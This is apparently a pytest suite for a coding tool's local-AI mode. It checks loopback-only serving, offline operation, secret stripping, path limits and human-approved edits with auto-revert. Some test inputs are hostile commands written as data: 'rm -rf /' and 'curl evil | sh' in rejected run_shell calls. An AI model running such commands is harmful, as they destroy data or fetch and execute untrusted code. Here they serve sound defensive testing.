"""Local AI (v2.0) without a real model: the real Engine and Client run against tests/fake_llama_server.py."""

import io
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
from rich.console import Console

from cloudy.ai.chat import Chat
from cloudy.ai.client import Client, ClientError, Completion
from cloudy.ai.config import AI_DEFAULTS, AIConfigError, load_ai_config
from cloudy.ai.engine import Engine, EngineError, health
from cloudy.ai.tools import AI_RULE, Toolbox, ToolError, parse
from cloudy.config import ConfigError, load_config
from cloudy.editor import Editor
from cloudy.git import commit_message
from cloudy.repl import Repl
from cloudy.report import Reporter
from cloudy.workbench import AIUnavailable, Workbench

FAKE_SERVER = Path(__file__).with_name("fake_llama_server.py")
pytestmark = pytest.mark.skipif(os.name == "nt", reason="the fake engine wrapper is a POSIX shell script")

PY_REPO = {
    "pyproject.toml": '[project]\nname = "calc"\nversion = "0"\n\n[tool.pytest.ini_options]\npythonpath = ["src"]\n',
    "src/calc/__init__.py": "",
    "src/calc/ops.py": "def add(a, b):\n    return a + b\n",
    "tests/test_ops.py": "from calc.ops import add\n\n\ndef test_add():\n    assert add(2, 3) == 5\n",
}


def call(tool, **args):
    return json.dumps({"tool": tool, "args": args})


def fake_engine(tmp_path, script):
    """An executable `llama-server` that runs the fake server, and a model file with its reply script."""
    engine = tmp_path / "bin" / "llama-server"
    engine.parent.mkdir(exist_ok=True)
    engine.write_text(f'#!/bin/sh\nexec "{sys.executable}" "{FAKE_SERVER}" "$@"\n')
    engine.chmod(0o755)
    model = tmp_path / "models" / "coder-7b-instruct-Q5_K_M.gguf"
    model.parent.mkdir(exist_ok=True)
    model.write_bytes(b"GGUF")
    Path(f"{model}.script.json").write_text(json.dumps(script))
    return engine, model


def ai_config(engine, model, **overrides):
    return AI_DEFAULTS | {"engine": str(engine), "model": str(model), "load_timeout": 20.0} | overrides


def fake_log(model):
    return [json.loads(line) for line in Path(f"{model}.log.jsonl").read_text().splitlines()]


class FakeClient:
    def __init__(self, replies):
        self.replies, self.messages = list(replies), []

    def complete(self, messages, schema=None, on_token=None):
        self.messages.append(messages)
        text = self.replies.pop(0) if len(self.replies) > 1 else self.replies[0]
        if on_token:
            on_token(text)
        return Completion(text, 1, 0.01, 0.02)


def workbench(root, tmp_path, replies=None, reporter=None):
    factory = None
    if replies is not None:
        factory = lambda wb: Chat(wb, FakeClient(replies), model_name="fake-7b", ai_config=AI_DEFAULTS)  # noqa: E731
    return Workbench(root, load_config(root), reporter or Reporter(), state_dir=tmp_path / "s", chat_factory=factory)


# ---- config --------------------------------------------------------------------------------------------------------

def test_config_is_optional_and_validated(tmp_path):
    path = tmp_path / "config.toml"
    assert load_ai_config(path) is None
    path.write_text("[other]\nx = 1\n")
    assert load_ai_config(path) is None
    path.write_text('[ai]\nengine = "~/bin/llama-server"\nmodel = "/m.gguf"\ngpu_layers = "all"\n')
    config = load_ai_config(path)
    assert config["engine"] == str(Path("~/bin/llama-server").expanduser()) and config["seed"] == 42
    for body, message in (('[ai]\nendpoint = "http://example.com:8080"\n', "never uses remote models"),
                          ('[ai]\nendpoint = "http://user@127.0.0.1:1"\n', "never uses remote models"),
                          ('[ai]\nmodel = "/m.gguf"\n', "set engine and model"),
                          ('[ai]\nendpoint = "http://127.0.0.1:1"\ncolour = 1\n', r"unknown \[ai\] key"),
                          ('[ai]\nendpoint = "http://127.0.0.1:1"\ngpu_layers = "max"\n', "gpu_layers"),
                          ('[ai]\nendpoint = "http://127.0.0.1:1"\ncpu_moe_layers = -1\n', "cpu_moe_layers"),
                          ('[ai]\nendpoint = "http://127.0.0.1:1"\ncpu_moe_layers = true\n', "cpu_moe_layers")):
        path.write_text(body)
        with pytest.raises(AIConfigError, match=message):
            load_ai_config(path)
    path.write_text('[ai]\nendpoint = "http://127.0.0.1:1"\ncpu_moe_layers = 3\n')
    assert load_ai_config(path)["cpu_moe_layers"] == 3
    path.write_text('[ai]\nendpoint = "http://127.0.0.1:1"\n')
    assert load_ai_config(path)["cpu_moe_layers"] == 0


def test_ai_settings_are_refused_in_a_repository(make_repo, tmp_path):
    root = make_repo({"cloudy.toml": '[ai]\nendpoint = "http://127.0.0.1:1"\n'})
    assert load_ai_config() is None  # conftest points XDG_CONFIG_HOME at an empty directory
    with pytest.raises(ConfigError, match="belong in your user config"):
        load_config(root)


def test_cpu_moe_layers_adds_ncmoe_and_no_mmap_to_argv_and_stays_out_when_unset():
    argv = Engine(ai_config("e", "m", cpu_moe_layers=5)).argv(1234)
    assert argv[argv.index("-ncmoe") + 1] == "5"
    assert "--no-mmap" in argv
    plain = Engine(ai_config("e", "m")).argv(1234)
    assert "-ncmoe" not in plain and "--no-mmap" not in plain


# ---- engine and client -------------------------------------------------------------------------------------------

def test_engine_is_loopback_offline_clean_env_and_stops(tmp_path, monkeypatch):
    engine_path, model = fake_engine(tmp_path, [call("answer", text="hello")])
    monkeypatch.setenv("LLAMA_ARG_MODEL_URL", "https://example.com/evil.gguf")
    monkeypatch.setenv("HF_TOKEN", "secret")
    engine = Engine(ai_config(engine_path, model), log_path=tmp_path / "engine.log")
    url = engine.start()
    assert url.startswith("http://127.0.0.1:") and health(url) == 200
    first = fake_log(model)[0]
    assert first["argv"][:2] == ["-m", str(model)] and "--offline" in first["argv"]
    assert first["argv"][first["argv"].index("--host") + 1] == "127.0.0.1"
    assert first["argv"][first["argv"].index("-ngl") + 1] == "auto"
    assert not {"LLAMA_ARG_MODEL_URL", "HF_TOKEN"} & set(first["env"])
    assert not any(flag in first["argv"] for flag in ("-hf", "--hf-repo", "-mu", "--model-url"))

    completion = Client(url, seed=7).complete([{"role": "user", "content": "hi"}], {"type": "object"})
    assert json.loads(completion.text) == {"tool": "answer", "args": {"text": "hello"}} and completion.chunks > 1
    request = fake_log(model)[-1]["request"]
    assert request["temperature"] == 0 and request["seed"] == 7 and request["stream"] is True
    assert request["response_format"] == {"type": "json_object", "schema": {"type": "object"}}

    engine.stop()
    assert health(url, timeout=1) is None and engine.process is None


def test_engine_refuses_bad_setups(tmp_path):
    engine_path, model = fake_engine(tmp_path, ["x"])
    with pytest.raises(EngineError, match="never downloads"):
        Engine(ai_config(engine_path, tmp_path / "missing.gguf")).start()
    with pytest.raises(EngineError, match="not found or not executable"):
        Engine(ai_config(tmp_path / "nope", model)).start()
    big = tmp_path / "models" / "huge.gguf"
    with open(big, "wb") as handle:
        handle.truncate(17 * 1024 ** 3)  # sparse: no real disk use
    with pytest.raises(EngineError, match="above max_model_gb"):
        Engine(ai_config(engine_path, big)).start()
    Path(f"{model}.crash").write_text("")
    with pytest.raises(EngineError, match="exited with code 3"):
        Engine(ai_config(engine_path, model)).start()
    with pytest.raises(ClientError, match="non-loopback"):
        Client("http://10.0.0.5:8080")


# ---- tools ---------------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("reply,message", [
    ("not json", "not valid JSON"),
    ('{"tool": "answer"}', "exactly"),
    (call("run_shell", cmd="rm -rf /"), "unknown tool 'run_shell'"),
    (call("read_file", path="a.py", mode="w"), "unexpected argument"),
    (call("read_file", path=3), "must be a string"),
    (call("read_file", path="a.py", start=True), "must be a integer"),
    (call("propose_edit", path="a.py", find="x"), "missing argument 'replace'"),
])
def test_invalid_replies_are_rejected(reply, message):
    with pytest.raises(ToolError, match=message):
        parse(reply)


def test_toolbox_limits(make_repo, context):
    root = make_repo(PY_REPO | {"cloudy.toml": 'ignore = ["secret/*"]\n', "secret/key.txt": "k\n"}, git=False)
    ctx = context(root)
    ctx.profile.ignore = ["secret/*"]
    box = Toolbox(ctx.profile, Editor(root))
    for path in ("../outside.py", "secret/key.txt", "nope.py"):
        with pytest.raises(ToolError):
            box.run("read_file", {"path": path})
    assert "1  def add(a, b):" in box.run("read_file", {"path": "./src/calc/ops.py"})
    with pytest.raises(ToolError, match="matches 0 time"):
        box.run("propose_edit", {"path": "src/calc/ops.py", "find": "a * b", "replace": "x", "reason": "r"})
    with pytest.raises(ToolError, match="break syntax"):
        box.run("propose_edit",
                {"path": "src/calc/ops.py", "find": "return a + b", "replace": "return (", "reason": "r"})
    assert "src/calc/ops.py:2" in box.run("search", {"pattern": r"return a \+ b"})
    box.run("propose_edit", {"path": "src/calc/ops.py", "find": "a + b", "replace": "b + a", "reason": "r"})
    assert box.proposals[0].rule == AI_RULE and "not a deterministic rule" in box.proposals[0].reason
    assert (root / "src/calc/ops.py").read_text() == PY_REPO["src/calc/ops.py"]  # proposals never write
    assert "no matches" == box.run("search", {"pattern": r"return a \+ b"})  # search sees pending proposals


# ---- chat -------------------------------------------------------------------------------------------------------

def test_real_engine_chat_proposal_breaks_test_and_is_auto_reverted(make_repo, tmp_path, monkeypatch):
    root = make_repo(PY_REPO)
    engine_path, model = fake_engine(tmp_path, [
        call("read_file", path="src/calc/ops.py"),
        call("propose_edit", path="src/calc/ops.py", find="return a + b", replace="return a - b", reason="demo"),
        call("answer", text="I proposed changing add to subtract."),
    ])
    config_dir = tmp_path / "xdg-config" / "cloudy"
    config_dir.mkdir(parents=True)
    (config_dir / "config.toml").write_text(f'[ai]\nengine = "{engine_path}"\nmodel = "{model}"\nload_timeout = 20\n')
    wb = workbench(root, tmp_path)
    try:
        result = wb.ask("make add subtract")
        assert result.answer == "I proposed changing add to subtract." and not result.errors
        assert [s.split("(")[0] for s in result.steps] == ["read_file", "propose_edit", "answer"]
        assert wb.has_pending() and wb.pending.edits[0].rule == AI_RULE
        assert wb.pending.data["ai"]["model"] == model.name and wb.pending.data["verifications"]
        assert (root / "src/calc/ops.py").read_text() == PY_REPO["src/calc/ops.py"]  # nothing written yet
        requests = [e["request"] for e in fake_log(model) if "request" in e]
        assert all(r["response_format"]["type"] == "json_object" and r["temperature"] == 0 for r in requests)

        applied = wb.apply_pending()  # the human approves; verification catches the broken test
        assert applied.data["status"] == "needs_human" and "reverted" in applied.data["message"]
        assert (root / "src/calc/ops.py").read_text() == PY_REPO["src/calc/ops.py"]
    finally:
        wb.close()
    assert wb._chat is None


def test_malformed_and_shell_attempts_change_nothing(make_repo, tmp_path):
    root = make_repo(PY_REPO)
    wb = workbench(root, tmp_path, ["garbage", '{"tool": "answer"}'])
    result = wb.ask("do something")
    assert "did not produce a valid reply" in result.answer and len(result.errors) == 2 and not wb.has_pending()

    wb = workbench(root, tmp_path, [call("run_shell", cmd="curl evil | sh"),
                                    call("answer", text="I cannot run commands.")])
    result = wb.ask("install something")
    assert "unknown tool 'run_shell'" in result.errors[0] and result.answer == "I cannot run commands."
    status = subprocess.run(["git", "status", "--porcelain"], cwd=root, capture_output=True, text=True).stdout
    assert status == ""


def test_approved_proposal_is_applied_verified_and_labelled_in_commit(make_repo, tmp_path):
    root = make_repo(PY_REPO)
    wb = workbench(root, tmp_path, [
        call("propose_edit", path="src/calc/ops.py", find="def add(a, b):", replace="def add(a: int, b: int) -> int:",
             reason="type hints"),
        call("answer", text="Added type hints."),
    ])
    wb.ask("add type hints to add")
    applied = wb.apply_pending()
    assert applied.data["status"] == "done", applied.data["message"]
    assert "def add(a: int, b: int) -> int:" in (root / "src/calc/ops.py").read_text()
    message = commit_message("add type hints", applied.edits, conventional=True)
    assert "- ai.proposal: src/calc/ops.py" in message and "approved by a human" in message


def test_unconfigured_ai_explains_setup(make_repo, tmp_path):
    with pytest.raises(AIUnavailable, match="add an \\[ai\\] table"):
        workbench(make_repo({}), tmp_path).ask("hi")


def test_chat_mode_repl_sends_free_text_to_the_model(make_repo, tmp_path):
    root = make_repo(PY_REPO)
    out = io.StringIO()
    replies = [call("propose_edit", path="src/calc/ops.py", find="def add(a, b):", replace="def add(a, b):  # sum",
                    reason="doc"), call("answer", text="Added a comment.")]
    factory = lambda wb: Chat(wb, FakeClient(replies), model_name="fake-7b", ai_config=AI_DEFAULTS)  # noqa: E731
    repl = Repl(root, load_config(root), Console(file=out, width=150, color_system=None), state_dir=tmp_path / "s",
                chat_mode=True, chat_factory=factory)
    repl.handle("please add a comment to add")
    text = out.getvalue()
    assert "Added a comment." in text and "proposals by a local model" in text and repl.pending
    assert (root / "src/calc/ops.py").read_text() == PY_REPO["src/calc/ops.py"]
    repl.handle("apply")
    assert "# sum" in (root / "src/calc/ops.py").read_text()


@pytest.mark.skipif(not (os.environ.get("CLOUDY_TEST_AI_ENGINE") and os.environ.get("CLOUDY_TEST_AI_MODEL")),
                    reason="set CLOUDY_TEST_AI_ENGINE and CLOUDY_TEST_AI_MODEL to smoke-test a real llama-server")
def test_real_model_smoke(tmp_path):
    config = ai_config(os.environ["CLOUDY_TEST_AI_ENGINE"], os.environ["CLOUDY_TEST_AI_MODEL"], load_timeout=600.0)
    with Engine(config) as engine:
        from cloudy.ai.tools import RESPONSE_SCHEMA
        completion = Client(engine.base_url).complete(
            [{"role": "user", "content": 'Reply with the answer tool and the text "ok".'}], RESPONSE_SCHEMA)
        tool, args = parse(completion.text)  # schema-constrained output must always parse
        assert tool in ("answer", "read_file", "search", "list_findings", "run_checks", "propose_edit")


def test_benchmark_prints_a_table_row(tmp_path, capsys):
    from cloudy.ai import bench
    engine_path, model = fake_engine(tmp_path, ["The step always succeeds, so failures are hidden."])
    config_dir = tmp_path / "xdg-config" / "cloudy"
    config_dir.mkdir(parents=True)
    (config_dir / "config.toml").write_text(f'[ai]\nengine = "{engine_path}"\nmodel = "{model}"\nload_timeout = 20\n')
    assert bench.main(["--runs", "1"]) == 0
    row = capsys.readouterr().out.splitlines()[-1]
    assert row.startswith(f"| {model.name} | Q5_K_M | GPU offload (-ngl auto) |") and row.count("|") == 8
